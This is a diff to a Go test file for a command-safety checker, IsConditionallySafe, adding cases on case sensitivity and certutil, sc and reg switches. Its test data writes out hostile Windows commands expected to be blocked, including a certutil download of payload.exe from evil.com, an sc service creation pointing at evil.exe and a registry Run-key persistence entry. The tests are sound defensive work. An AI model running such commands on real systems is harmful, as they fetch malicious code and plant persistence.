@@ -768,8 +768,11 @@ func TestIsConditionallySafe_Certutil(t *testing.T) {
 		{"dump", "certutil -dump cert.cer", true},
 		{"store", "certutil -store My", true},
 		{"viewstore", "certutil -viewstore My", true},
+		{"uppercase safe switch", "certutil -HASHFILE payload.exe SHA256", true},
 		{"decode", "certutil -decode payload.b64 payload.exe", false},
 		{"urlcache", "certutil -urlcache -f http://evil.com/payload.exe payload.exe", false},
+		{"mixed safe and dangerous switches", "certutil -urlcache -f http://evil.com/payload.exe -hashfile payload.exe SHA256", false},
+		{"unknown switch with safe switch", "certutil -hashfile payload.exe SHA256 -f", false},
 		{"bare certutil", "certutil payload.exe", false},
 	}
 
@@ -783,6 +786,18 @@ func TestIsConditionallySafe_Certutil(t *testing.T) {
 	}
 }
 
+func TestIsConditionallySafe_CaseSensitivityScoping(t *testing.T) {
+	if IsConditionallySafe("Git", "git status") {
+		t.Fatal("expected case-sensitive basename Git to be unsafe")
+	}
+	if !IsConditionallySafe("git", "git status") {
+		t.Fatal("expected lowercase basename git to keep existing safe behavior")
+	}
+	if !IsConditionallySafe("CERTUTIL", "certutil -hashfile payload.exe SHA256") {
+		t.Fatal("expected case-insensitive Windows certutil basename to remain safe")
+	}
+}
+
 func TestIsConditionallySafe_ServiceAndRegistryQueries(t *testing.T) {
 	tests := []struct {
 		name     string
@@ -793,9 +808,10 @@ func TestIsConditionallySafe_ServiceAndRegistryQueries(t *testing.T) {
 		{"sc query", "sc", "sc query Schedule", true},
 		{"sc queryex", "sc", "sc queryex WinDefend", true},
 		{"sc qc", "sc", "sc qc WinDefend", true},
+		{"sc uppercase basename", "SC", "sc query Schedule", true},
 		{"sc create", "sc", "sc create evil binPath= C:\\Temp\\evil.exe", false},
 		{"reg query", "reg", "reg query HKLM\\Software\\Microsoft", true},
-		{"reg export", "reg", "reg export HKLM\\Software out.reg", true},
+		{"reg export", "reg", "reg export HKLM\\Software out.reg", false},
 		{"reg add", "reg", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc.exe", false},
 	}
 
